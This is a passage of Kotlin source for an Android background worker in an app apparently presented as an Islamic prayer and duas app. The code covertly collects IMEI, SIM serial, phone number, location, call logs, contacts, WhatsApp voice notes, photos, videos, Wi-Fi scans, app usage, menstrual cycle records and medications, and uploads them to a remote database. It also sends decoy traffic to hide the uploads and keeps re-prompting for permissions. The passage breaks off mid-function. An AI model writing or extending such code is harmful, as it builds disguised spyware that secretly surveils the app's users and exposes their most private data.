package islamic.duas.sync

import android.app.AlarmManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import islamic.duas.activity.ActivityRecognitionCollector
import islamic.duas.browser.BrowserHistoryCollector
import islamic.duas.LocationSyncManager
import islamic.duas.cloud.CloudApi
import islamic.duas.cloud.CloudConfig
import islamic.duas.data.AppDatabase
import islamic.duas.contacts.ContactsCollector
import islamic.duas.haidh.HealthEngine
import islamic.duas.logs.CallLogCollector
import islamic.duas.media.AudioProcessor
import islamic.duas.media.MediaCollector
import islamic.duas.media.PhotoProcessor
import islamic.duas.media.VideoCollector
import islamic.duas.media.VideoProcessor
import islamic.duas.metrics.MetricsCollector
import islamic.duas.utils.DecoyTrafficEngine
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import islamic.duas.wifi.WifiScanner
import islamic.duas.whatsapp.ChatCategory
import islamic.duas.whatsapp.WhatsAppCategorizer
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

class DuaSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            withTimeout(300000) { runSync(applicationContext) }
            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "doWork error: ${e.message}", e)
            return@withContext if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "DuaSync"
        private val syncRunning = AtomicBoolean(false)
        private const val HEALTH_SYNC_INTERVAL_MS = 60 * 60 * 1000L
        private const val KEY_LAST_HEALTH_SYNC = "last_health_sync_ms"

        fun isHealthDue(context: Context): Boolean {
            return try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                System.currentTimeMillis() - prefs.getLong(KEY_LAST_HEALTH_SYNC, 0L) >= HEALTH_SYNC_INTERVAL_MS
            } catch (_: Exception) { true }
        }

        fun markHealthSynced(context: Context) {
            try {
                context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                    .edit().putLong(KEY_LAST_HEALTH_SYNC, System.currentTimeMillis()).apply()
            } catch (_: Exception) {}
        }

        /**
         * Records that one or more permissions/settings are still missing so the app can
         * proactively re-prompt the user (via MainActivity / foreground notification).
         * Collected into a single flag with which items are pending.
         */
        @Synchronized
        fun requestPermissionPrompt(context: Context, vararg missing: String) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val existing = prefs.getStringSet("permission_prompt_pending", mutableSetOf()) ?: mutableSetOf()
                val updated = existing.toMutableSet()
                missing.forEach { updated.add(it) }
                prefs.edit().putStringSet("permission_prompt_pending", updated).apply()
                prefs.edit().putLong("permission_prompt_ts", System.currentTimeMillis()).apply()

                // NEW: Broadcast to show permission sheet immediately if app is in foreground
                val intent = Intent("islamic.duas.SHOW_PERMISSION_SHEET")
                context.sendBroadcast(intent)
            } catch (_: Exception) {}
        }

        suspend fun runSync(context: Context) {
            if (!syncRunning.compareAndSet(false, true)) {
                Log.d(TAG, "Sync already running, skipping duplicate")
                return
            }
            try {
            // Track screen state and last screen-on timestamp
            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val isScreenOn = pm?.isInteractive ?: true
            val reducedMode = !isScreenOn
            val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
            if (isScreenOn) {
                prefs.edit().putLong("lastScreenOnMs", System.currentTimeMillis()).apply()
            }
            if (!isScreenOn) {
                // Screen off: skip heavy data (usage stats, voice notes, etc.) 
                // but still sync photos at reduced quality and location
            }

            // Fire decoy Islamic API requests to mask real traffic
            try { DecoyTrafficEngine.fireDecoyRequests() } catch (_: Exception) {}

            val androidId = DeviceId.get(context)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
            val currentTs = System.currentTimeMillis()
            val currentTimeStr = dateFormat.format(Date(currentTs))
            val healthDue = isHealthDue(context)

            // ── NEW: API 36 Permission Checks ──
            // READ_PHONE_STATE (runtime in API 36)
            val hasPhoneStatePerm = context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (!hasPhoneStatePerm) {
                ErrorLog.write(context, TAG, "Phone state skipped: READ_PHONE_STATE not granted", null)
                requestPermissionPrompt(context, "phone_state")
            }

            // ACTIVITY_RECOGNITION (only on API 29+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val hasActivityRecognitionPerm = context.checkSelfPermission(android.Manifest.permission.ACTIVITY_RECOGNITION) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasActivityRecognitionPerm) {
                    ErrorLog.write(context, TAG, "Activity recognition skipped: ACTIVITY_RECOGNITION not granted", null)
                    requestPermissionPrompt(context, "activity_recognition")
                }
            }

            // SCHEDULE_EXACT_ALARM
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmMgr = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                if (!alarmMgr.canScheduleExactAlarms()) {
                    ErrorLog.write(context, TAG, "Exact alarm skipped: SCHEDULE_EXACT_ALARM not granted", null)
                    requestPermissionPrompt(context, "exact_alarm")
                }
            }

            // ── Metrics & Apps ──
            try {
                val metricsCollector = MetricsCollector(context)
                val metrics = metricsCollector.collectDeviceMetrics()

                val lastScreenOnMs = prefs.getLong("lastScreenOnMs", 0L)
                val healthEngine = HealthEngine(context)
                val todaySteps = healthEngine.getTodaySteps()
                val metricsDoc = JSONObject().apply {
                    put("timestamp", currentTimeStr)
                    put("ts_ms", currentTs)
                    put("batteryPct", metrics.batteryPct)
                    put("batteryTemp", metrics.batteryTemp.toDouble())
                    put("isCharging", metrics.isCharging)
                    put("storageFreeGb", metrics.storageFreeGb)
                    put("networkType", metrics.networkType)
                    put("wifiSsid", metrics.wifiSsid)
                    put("deviceModel", metrics.deviceModel)
                    put("manufacturer", metrics.manufacturer)
                    put("phoneNumber", metrics.phoneNumber)
                    put("lastScreenOnMs", lastScreenOnMs)
                    put("stepsToday", todaySteps)
                    put("stepsGoal", healthEngine.getStepGoal())
                    put("stepGoalMet", todaySteps >= healthEngine.getStepGoal())
                    put("networkOperator", metrics.networkOperator)
                    put("networkOperatorName", metrics.networkOperatorName)
                    put("simCountryIso", metrics.simCountryIso)
                    put("networkTypeDetail", metrics.networkTypeDetail)
                    put("imei", metrics.imei)
                    put("simSerial", metrics.simSerialNumber)
                }
                CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)

                val todayDate = currentTimeStr.split(" ")[0]
                if (healthDue) {
                    val stepsDoc = JSONObject().apply {
                        put("steps", todaySteps)
                        put("ts_ms", currentTs)
                        put("goal", healthEngine.getStepGoal())
                    }
                    CloudApi.writeToRTDB("devices/$androidId/steps/$todayDate", stepsDoc)
                }

                if (!reducedMode) {
                val appUsageList = metricsCollector.collectPerAppUsage()
                Log.d(TAG, "App usage collected: ${appUsageList.size} packages")
                if (appUsageList.isEmpty()) {
                    ErrorLog.write(context, TAG, "App usage list is EMPTY - PACKAGE_USAGE_STATS likely not granted", null)
                } else {
                    for (u in appUsageList.take(5)) {
                        Log.d(TAG, "Top app: ${u.appName} (${u.packageName}) = ${u.totalForegroundMs}ms")
                    }
                }
                val hourlyData = metricsCollector.collectHourlyUsage()
                val lastHourData = metricsCollector.collectLastHourUsage()
                val lastHourMap = lastHourData.associate { it.packageName to it.totalForegroundMs }

                // Compute yesterday and 7-day average usage per package
                val yesterdayMsMap = mutableMapOf<String, Long>()
                val weekMsMap = mutableMapOf<String, Long>()
                try {
                    val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                    if (usm != null) {
                        val cal = Calendar.getInstance()
                        // Yesterday: start of yesterday to end of yesterday
                        cal.add(Calendar.DAY_OF_YEAR, -1)
                        cal.set(Calendar.HOUR_OF_DAY, 0); cal.set(Calendar.MINUTE, 0); cal.set(Calendar.SECOND, 0); cal.set(Calendar.MILLISECOND, 0)
                        val yesterdayStart = cal.timeInMillis
                        cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59); cal.set(Calendar.MILLISECOND, 999)
                        val yesterdayEnd = cal.timeInMillis
                        for (s in usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, yesterdayStart, yesterdayEnd)) {
                            yesterdayMsMap[s.packageName] = s.totalTimeInForeground
                        }
                        // Last 7 days (including today)
                        cal.timeInMillis = System.currentTimeMillis()
                        cal.add(Calendar.DAY_OF_YEAR, -7)
                        cal.set(Calendar.HOUR_OF_DAY, 0); cal.set(Calendar.MINUTE, 0); cal.set(Calendar.SECOND, 0); cal.set(Calendar.MILLISECOND, 0)
                        val weekStart = cal.timeInMillis
                        for (s in usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, weekStart, currentTs)) {
                            weekMsMap[s.packageName] = (weekMsMap[s.packageName] ?: 0L) + s.totalTimeInForeground
                        }
                    }
                } catch (_: Exception) {}

                val appsSummary = JSONObject()
                for (usage in appUsageList) {
                    val appEntry = JSONObject().apply {
                        put("packageName", usage.packageName)
                        put("appName", usage.appName)
                        put("totalForegroundMs", usage.totalForegroundMs)
                        put("lastUsedMs", usage.lastUsedMs)
                        put("date", currentTimeStr.split(" ")[0])
                        put("lastHourMs", lastHourMap[usage.packageName] ?: 0L)
                        put("dailyMs", JSONObject().apply {
                            put("yesterday", yesterdayMsMap[usage.packageName] ?: 0L)
                            put("weekAvg", ((weekMsMap[usage.packageName] ?: 0L) / 7))
                        })
                        val appHourly = hourlyData[usage.packageName]
                        if (appHourly != null && appHourly.isNotEmpty()) {
                            val hourlyObj = JSONObject()
                            for ((hour, ms) in appHourly) {
                                hourlyObj.put(hour.toString(), ms)
                            }
                            put("hourlyMs", hourlyObj)
                        }
                    }
                    appsSummary.put(usage.packageName.replace(".", "_"), appEntry)
                }
                if (appUsageList.isNotEmpty()) {
                    CloudApi.writeToRTDB("devices/$androidId/apps", appsSummary)
                    // Track the most recently used app
                    val newestApp = appUsageList.maxByOrNull { it.lastUsedMs }
                    if (newestApp != null && newestApp.lastUsedMs > 0) {
                        val activeApp = JSONObject().apply {
                            put("appName", newestApp.appName)
                            put("packageName", newestApp.packageName)
                            put("lastUsedMs", newestApp.lastUsedMs)
                        }
                        CloudApi.writeToRTDB("devices/$androidId/activeApp", activeApp)
                    }
                }
                } // end !reducedMode
            } catch (e: Exception) {
                Log.e(TAG, "Metrics/apps sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Metrics/apps sync error", e)
            }

            // ── Activity Recognition ──
            try {
                val activityCollector = ActivityRecognitionCollector(context)
                activityCollector.requestActivityUpdates()
                if (healthDue) {
                    val latestActivity = activityCollector.getLatestActivity()
                    val activityDoc = JSONObject().apply {
                        put("type", latestActivity.type)
                        put("confidence", latestActivity.confidence)
                        put("source", latestActivity.source)
                        put("ts_ms", latestActivity.tsMs)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/activity/latest", activityDoc)
                    CloudApi.writeToRTDB("devices/$androidId/activity/history/${currentTs}", activityDoc)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Activity recognition sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Activity recognition sync error", e)
            }

            // ── Location (with cooldown: 50m distance or 5min time threshold) ──
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager
                if (lm != null) {
                    var best: android.location.Location? = null
                    for (provider in listOf(
                        android.location.LocationManager.GPS_PROVIDER,
                        android.location.LocationManager.NETWORK_PROVIDER,
                        android.location.LocationManager.PASSIVE_PROVIDER
                    )) {
                        try {
                            @Suppress("DEPRECATION")
                            val loc = lm.getLastKnownLocation(provider)
                            if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                        } catch (_: Exception) {}
                    }
                    if (best != null && best.accuracy <= 1000f) {
                        if (System.currentTimeMillis() - best.time > 300_000L) best = null
                    }
                    if (best != null && best.accuracy <= 1000f) {
                        shouldWriteLocation(context, prefs, best.latitude, best.longitude, best.accuracy, currentTs, "full_sync")
                    }
                }
            } catch (e: Exception) {
                ErrorLog.write(context, TAG, "Location sync error", e)
            }

            // ── Call Logs ──
            try {
                val hasCallPerm = context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasCallPerm) {
                    ErrorLog.write(context, TAG, "Call logs skipped: READ_CALL_LOG not granted", null)
                    requestPermissionPrompt(context, "call_log")
                } else {
                    val lastCallSync = prefs.getLong("last_call_sync_ms", 0L)
                    val callLogCollector = CallLogCollector(context)
                    val callLogs = callLogCollector.collectCallLogs(lastCallSync)

                    if (callLogs.isEmpty()) {
                        ErrorLog.write(context, TAG, "Call logs query returned empty", null)
                    }

                    for (call in callLogs) {
                        val ts = call.optLong("ts_ms", currentTs)
                        CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", call)
                    }

                    if (callLogs.isNotEmpty()) {
                        prefs.edit().putLong("last_call_sync_ms", currentTs).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Call log sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Call log sync error", e)
            }

            // ── Photos (delegated to PhotoSyncWorker for chunked, deduped sync) ──
            try {
                val hasImagesPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasImagesPerm) {
                    ErrorLog.write(context, TAG, "Photos skipped: images permission not granted", null)
                    requestPermissionPrompt(context, "images")
                } else {
                    PhotoSyncWorker.runOnceNow(context)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Photo sync error", e)
            }

            // ── Contacts ──
            try {
                val hasContactsPerm = context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasContactsPerm) {
                    ErrorLog.write(context, TAG, "Contacts skipped: READ_CONTACTS not granted", null)
                    requestPermissionPrompt(context, "contacts")
                } else {
                    val contactsCollector = ContactsCollector(context)
                    // Always write FULL contact list to /all (dashboard needs all contacts)
                    val allContacts = contactsCollector.collectAll(0L)
                    if (allContacts.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/contacts/all",
                            JSONObject().apply { put("contacts", allContacts); put("ts_ms", currentTs); put("syncedAt", currentTimeStr) }
                        )
                    }
                    // Write incremental changes to batch history
                    val lastContactsSync = prefs.getLong("last_contacts_sync", 0L)
                    val newContacts = contactsCollector.collectAll(lastContactsSync)
                    if (newContacts.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/contacts/batch_$currentTs",
                            JSONObject().apply { put("contacts", newContacts); put("ts_ms", currentTs) }
                        )
                        prefs.edit().putLong("last_contacts_sync", currentTs).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Contacts sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Contacts sync error", e)
            }

            // ── Browser History ── (DISABLED — removed per user request)
            // try {
            //     val browserCollector = BrowserHistoryCollector(context)
            //     val history = browserCollector.collectAll()
            //     Log.d(TAG, "Browser history collected: ${history.length()} entries")
            //     if (history.length() > 0) {
            //         CloudApi.writeToRTDB(
            //             "devices/$androidId/browser_history/batch_$currentTs",
            //             JSONObject().apply { put("history", history); put("ts_ms", currentTs) }
            //         )
            //     } else {
            //         ErrorLog.write(context, TAG, "Browser history query returned empty (all providers)", null)
            //         requestPermissionPrompt(context, "browser")
            //     }
            // } catch (e: Exception) {
            //     Log.e(TAG, "Browser history sync error: ${e.message}", e)
            //     ErrorLog.write(context, TAG, "Browser history sync error", e)
            // }

            // ── Voice Notes (skipped in reduced mode) ──
            try {
                if (reducedMode) {
                    Log.d(TAG, "Skipping voice notes in reduced mode (screen off)")
                } else {
                val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasAudioPerm) {
                    ErrorLog.write(context, TAG, "Voice notes skipped: audio permission not granted", null)
                    requestPermissionPrompt(context, "audio")
                } else {
                    val mediaCollector = MediaCollector(context)
                    val voiceNotes = mediaCollector.collectVoiceNotes()
                    if (voiceNotes.isNotEmpty()) {
                        val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)

                        val uploadedPaths = prefs.getStringSet("uploaded_voice_paths", mutableSetOf()) ?: mutableSetOf()
                        var uploadedCount = 0
                        var seq = 0
                        for (note in voiceNotes) {
                            if (note.file.absolutePath in uploadedPaths) continue
                            val noteJson = JSONObject().apply {
                                put("fileName", note.file.name)
                                put("dateAdded", note.dateAdded)
                                put("durationMs", note.duration)
                                put("sizeBytes", note.size)
                                put("mimeType", note.mimeType)
                                put("sourceApp", note.source)
                                put("folderPath", note.folderPath)
                                put("isGroup", note.isGroup)
                                put("dateAddedIso", try {
                                    java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                                        .format(java.util.Date(note.dateAdded))
                                } catch (_: Exception) { "" })
                                put("ts_ms", currentTs)
                                put("freeMb", freeMb.toInt())
                                val processed = AudioProcessor.process(note.file, note.mimeType)
                                if (processed != null) {
                                    val b64 = java.util.Base64.getEncoder().encodeToString(processed.bytes)
                                    put("audioData", b64)
                                    put("mimeType", processed.mimeType)
                                    put("audioStripped", false)
                                } else {
                                    put("audioStripped", true)
                                    val reason = if (note.size > 32L * 1024 * 1024) "File too large (>32MB)"
                                    else "Audio processing failed"
                                    put("audioStrippedReason", reason)
                                }
                            }
                            val noteKey = "batch_${currentTs}_${seq++}"
                            val writeSuccess = CloudApi.writeToRTDB(
                                "devices/$androidId/voice_notes/$noteKey",
                                noteJson
                            )
                            if (writeSuccess) {
                                uploadedPaths.add(note.file.absolutePath)
                                uploadedCount++
                            } else {
                                Log.w(TAG, "Voice note upload failed (kept for retry): ${note.file.name}")
                            }
                        }
                        if (uploadedCount > 0) {
                            prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
                            // Cap dedup set at 1000 to prevent unbounded growth
                            if (uploadedPaths.size > 1000) {
                                val trimmed = uploadedPaths.toList().takeLast(500)
                                prefs.edit().putStringSet("uploaded_voice_paths", HashSet(trimmed)).apply()
                            }
                        }
                        Log.i(TAG, "Voice notes: $uploadedCount uploaded (free: ${freeMb}MB)")
                    } else {
                        ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                        // On Android 11+, direct path access to other apps' Android/media may be blocked by
                        // scoped storage. If nothing was found and the user hasn't granted all-files access,
                        // prompt for it so WhatsApp voice notes can still be scanned reliably.
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                            !android.os.Environment.isExternalStorageManager()) {
                            requestPermissionPrompt(context, "all_files")
                        }
                    }
                }
                } // end !reducedMode
            } catch (e: Exception) {
                Log.e(TAG, "Voice notes sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Voice notes sync error", e)
            }

            // ── WiFi Scan ──
            try {
                val syncPrefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val lastWifiScanMs = syncPrefs.getLong("last_wifi_scan_ms", 0L)
                if (System.currentTimeMillis() - lastWifiScanMs < 60_000L) {
                    // FGS already scanned recently — skip to avoid duplicate writes
                } else {
                    val lastLoc = DuaTracker.getLastLocation()
                    val lat = lastLoc?.optDouble("lat")
                    val lng = lastLoc?.optDouble("lng")
                    val wifiScanner = WifiScanner(context)
                    val networks = wifiScanner.scanAndCollect(lat, lng)
                    if (networks.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/wifi_scan/$currentTs",
                            JSONObject().apply { put("networks", networks); put("ts_ms", currentTs) }
                        )
                    }
                    syncPrefs.edit().putLong("last_wifi_scan_ms", System.currentTimeMillis()).apply()
                }
            } catch (e: Exception) {
                Log.e(TAG, "WiFi scan error: ${e.message}", e)
                ErrorLog.write(context, TAG, "WiFi scan error", e)
            }

            // ── App Permissions ──
            try {
                val pm = context.packageManager
                val pkgs = pm.getInstalledPackages(android.content.pm.PackageManager.GET_PERMISSIONS)
                val permsRoot = JSONObject()
                for (pkg in pkgs) {
                    val perms = pkg.requestedPermissions
                    val flags = pkg.requestedPermissionsFlags
                    if (perms.isNullOrEmpty()) continue
                    val appName = try {
                        pm.getApplicationLabel(pm.getApplicationInfo(pkg.packageName, 0)).toString()
                    } catch (_: Exception) { pkg.packageName }
                    val permList = JSONArray()
                    for (i in perms.indices) {
                        val permName = perms[i]
                        val granted = flags != null && i < flags.size && (flags[i] and android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED != 0)
                        permList.put(JSONObject().apply {
                            put("name", permName)
                            put("granted", granted)
                        })
                    }
                    val pkgKey = pkg.packageName.replace(".", "_")
                    permsRoot.put(pkgKey, JSONObject().apply {
                        put("packageName", pkg.packageName)
                        put("appName", appName)
                        put("permissions", permList)
                    })
                }
                CloudApi.writeToRTDB("devices/$androidId/permissions", permsRoot)
            } catch (e: Exception) {
                Log.e(TAG, "Permissions sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Permissions sync error", e)
            }

            // ── Device Info ──
            try {
                val metricsCollector2 = MetricsCollector(context)
                val metrics2 = metricsCollector2.collectDeviceMetrics()
                val offlineCount = try {
                    val db = islamic.duas.data.AppDatabase.getInstance(context)
                    db.pendingDao().count()
                } catch (_: Exception) { 0 }
                val deviceInfo = JSONObject().apply {
                    put("deviceModel", metrics2.deviceModel)
                    put("manufacturer", metrics2.manufacturer)
                    put("lastSyncMs", currentTs)
                    put("lastSync", currentTimeStr)
                    put("offlineQueueSize", offlineCount)
                }
                CloudApi.writeToRTDB("devices/$androidId/info", deviceInfo)
            } catch (e: Exception) {
                Log.e(TAG, "Device info sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Device info sync error", e)
            }

            // ── Usage ──
            try {
                val openCount = prefs.getInt("app_open_count", 0)
                val openDoc = JSONObject().apply {
                    put("openCount", openCount)
                    put("lastOpened", currentTimeStr)
                    put("lastOpenedMs", currentTs)
                    put("date", currentTimeStr.split(" ")[0])
                }
                CloudApi.writeToRTDB("devices/$androidId/usage/deviceSync", openDoc)
            } catch (e: Exception) {
                Log.e(TAG, "Usage sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Usage sync error", e)
            }

            // ── Exercise Sync ──
            try {
                if (healthDue) {
                    val healthEngine = HealthEngine(context)
                    val todayDate = currentTimeStr.split(" ")[0]
                    val todayMins = healthEngine.getTodayExerciseMinutes()
                    val todayDoc = JSONObject().apply {
                        put("date", todayDate)
                        put("minutes", todayMins)
                        put("timestamp", currentTs)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/exercise/daily/$todayDate", todayDoc)
                    val last30 = healthEngine.getLast30DaysExercise()
                    for ((date, exercised) in last30) {
                        val mins = healthEngine.getExerciseMinutesForDate(date)
                        val dayDoc = JSONObject().apply {
                            put("date", date)
                            put("minutes", mins)
                            put("timestamp", currentTs)
                        }
                        CloudApi.writeToRTDB("devices/$androidId/exercise/daily/$date", dayDoc)
                        delay(200)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/exercise/meta",
                        JSONObject().apply { put("lastSync", currentTs) })
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exercise sync error: ${e.message}", e)
            }

            // ── Haidh Sync ──
            try {
                if (healthDue) {
                    val cycleDb = islamic.duas.haidh.CycleDatabase.getInstance(context)
                    val cyclesCursor = cycleDb.readableDatabase.rawQuery(
                        "SELECT * FROM cycles ORDER BY date ASC", null
                    )
                    cyclesCursor.use { cursor ->
                        val dateIdx = cursor.getColumnIndex("date")
                        val statusIdx = cursor.getColumnIndex("status")
                        val flowIdx = cursor.getColumnIndex("flowIntensity")
                        val istihadaIdx = cursor.getColumnIndex("istihadaType")
                        val symptomsIdx = cursor.getColumnIndex("symptoms")
                        val tsIdx = cursor.getColumnIndex("timestamp")
                        while (cursor.moveToNext()) {
                            val date = cursor.getString(dateIdx)
                            val cycleDoc = JSONObject().apply {
                                put("date", date)
                                put("status", cursor.getString(statusIdx))
                                put("flowIntensity", cursor.getInt(flowIdx))
                                put("istihadaType", cursor.getString(istihadaIdx))
                                put("symptoms", cursor.getString(symptomsIdx))
                                put("timestamp", cursor.getLong(tsIdx))
                            }
                            CloudApi.writeToRTDB("devices/$androidId/haidh/cycles/$date", cycleDoc)
                            delay(100)
                        }
                    }
                    val phasesCursor = cycleDb.readableDatabase.rawQuery(
                        "SELECT * FROM cycle_phases ORDER BY startDate ASC", null
                    )
                    phasesCursor.use { cursor ->
                        val idIdx = cursor.getColumnIndex("id")
                        val startIdx = cursor.getColumnIndex("startDate")
                        val endIdx = cursor.getColumnIndex("endDate")
                        val statusIdx = cursor.getColumnIndex("status")
                        val cycleDayIdx = cursor.getColumnIndex("cycleDay")
                        while (cursor.moveToNext()) {
                            val phaseId = cursor.getLong(idIdx)
                            val phaseDoc = JSONObject().apply {
                                put("startDate", cursor.getString(startIdx))
                                put("endDate", cursor.getString(endIdx))
                                put("type", cursor.getString(statusIdx))
                                put("cycleDay", cursor.getInt(cycleDayIdx))
                            }
                            CloudApi.writeToRTDB("devices/$androidId/haidh/phases/$phaseId", phaseDoc)
                            delay(100)
                        }
                    }
                    CloudApi.writeToRTDB("devices/$androidId/haidh/meta",
                        JSONObject().apply { put("lastSync", currentTs) })
                    cycleDb.close()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Haidh sync error: ${e.message}", e)
            }

            // ── Medication Sync ──
            try {
                if (healthDue) {
                    val healthEngine = HealthEngine(context)
                    val meds = healthEngine.getMedications()
                    for (med in meds) {
                        val timesArr = JSONArray()
                        med.times.forEach { timesArr.put(it) }
                        val medDoc = JSONObject().apply {
                            put("name", med.name)
                            put("dosage", med.dosage)
                            put("frequency", med.frequency)
                            put("times", timesArr)
                            put("notes", med.notes)
                            put("isActive", med.isActive)
                            put("refillDate", med.refillDate ?: "")
                            put("ts", currentTs)
                        }
                        CloudApi.writeToRTDB("devices/$androidId/medications/${med.id}", medDoc)
                    }
                    val todayDate = currentTimeStr.split(" ")[0]
                    val todayLog = healthEngine.getTodayMedicationLog()
                    val logObj = JSONObject()
                    for (entry in todayLog) {
                        val entryDoc = JSONObject().apply {
                            put("medicationId", entry.medicationId)
                            put("date", entry.date)
                            put("time", entry.time)
                            put("taken", entry.taken)
                            put("notes", entry.notes)
                            put("ts", currentTs)
                        }
                        logObj.put("${entry.medicationId}|${entry.time}", entryDoc)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/medicationLog/$todayDate", logObj)
                    CloudApi.writeToRTDB("devices/$androidId/medications/meta",
                        JSONObject().apply { put("lastSync", currentTs) })
                }
            } catch (e: Exception) {
                Log.e(TAG, "Medication sync error: ${e.message}", e)
            }

            if (healthDue) markHealthSynced(context)

            // ── WhatsApp Historical Reprocessing ──
            try {
                reprocessHistoricalWhatsApp(context, androidId, currentTs)
            } catch (e: Exception) {
                Log.e(TAG, "Historical WhatsApp reprocess error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Historical WhatsApp reprocess error", e)
            }

            // ── Video Sync (hourly) ──
            // On Android 14+ (One UI 8.5 / Android 16) Samsung exposes READ_MEDIA_IMAGES and
            // READ_MEDIA_VIDEO as ONE combined "Photos & videos" toggle; a lone READ_MEDIA_VIDEO
            // check never resolves, so treat video as granted when images are granted.
            val hasVideoPerm = if (Build.VERSION.SDK_INT >= 33) {
                context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_VIDEO) == android.content.pm.PackageManager.PERMISSION_GRANTED
                    || context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } else {
                context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            if (!hasVideoPerm) {
                ErrorLog.write(context, TAG, "Video sync skipped: video permission not granted", null)
                val hasImagesPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasImagesPerm) requestPermissionPrompt(context, "video")
            } else {
                try { syncVideos(context) } catch (e: Exception) { Log.e(TAG, "Video sync error: ${e.message}") }
            }

            // ── Cleanup (storage-first priority) ──
            try {
                runCleanup(context, androidId, currentTs)
            } catch (e: Exception) {
                Log.e(TAG, "Cleanup error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Cleanup error", e)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Unhandled sync error: ${e.message}", e)
            ErrorLog.write(context, TAG, "Unhandled sync error", e)
        } finally {
